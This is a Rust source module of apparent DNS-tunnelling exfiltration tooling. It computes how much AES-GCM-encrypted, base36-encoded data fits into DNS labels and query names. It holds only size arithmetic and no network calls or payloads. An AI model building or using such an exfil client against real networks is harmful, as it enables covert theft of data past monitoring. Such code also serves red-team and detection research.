//! Shared DNS framing limits and helpers for the exfil client.

pub const DNS_MAX_NAME: usize = 253;
pub const LABEL_CAP: usize = 62;
pub const AES_GCM_OVERHEAD: usize = 28;
pub const SESSION_TAG_LEN: usize = 3;
pub const META_LABEL_PREFIX: &str = "EX";
pub const PAD_LABEL: &str = "0";
pub const ENVELOPE_LEN: usize = SESSION_TAG_LEN + 1 + 1 + 4; // version + flags + tag + counter

const LOG36_OF_2: f64 = 0.193_426_403_617_270_83;
const MAX_CHUNK_PROBE: usize = 512;

/// Estimate the number of base36 characters necessary to encode `bytes`.
pub fn estimate_base36_len(bytes: usize) -> usize {
    if bytes == 0 {
        return 1;
    }
    let bits = (bytes * 8) as f64;
    (bits * LOG36_OF_2).ceil() as usize
}

/// Calculate the encoded length for a plaintext payload after AES-GCM wrapping + base36.
pub fn encoded_len_for_payload(plaintext_len: usize) -> usize {
    let cipher_len = plaintext_len + AES_GCM_OVERHEAD;
    estimate_base36_len(cipher_len)
}

fn metadata_label_len() -> usize {
    META_LABEL_PREFIX.len() + encoded_len_for_payload(ENVELOPE_LEN)
}

fn data_label_count(encoded_len: usize) -> usize {
    if encoded_len == 0 {
        1
    } else {
        (encoded_len + LABEL_CAP - 1) / LABEL_CAP
    }
}

fn fqdn_length_for_chunk(chunk_bytes: usize, domain_len: usize) -> usize {
    if chunk_bytes == 0 {
        return 0;
    }

    let encoded_len = encoded_len_for_payload(chunk_bytes);
    let labels = data_label_count(encoded_len) + 1; // payload + metadata labels
    domain_len + metadata_label_len() + encoded_len + labels
}

fn longest_domain_length(domains: &[&str]) -> usize {
    domains
        .iter()
        .map(|d| d.trim().trim_end_matches('.').len())
        .max()
        .unwrap_or(0)
}

/// Compute the largest safe chunk size (in plaintext bytes) for the provided domains.
pub fn max_supported_chunk_bytes(domains: &[&str]) -> usize {
    let domain_len = longest_domain_length(domains);
    if domain_len == 0 {
        return 0;
    }

    let mut best = 0usize;
    for chunk in 1..=MAX_CHUNK_PROBE {
        let fqdn_len = fqdn_length_for_chunk(chunk, domain_len);
        if fqdn_len > 0 && fqdn_len <= DNS_MAX_NAME {
            best = chunk;
        } else {
            break;
        }
    }
    best
}
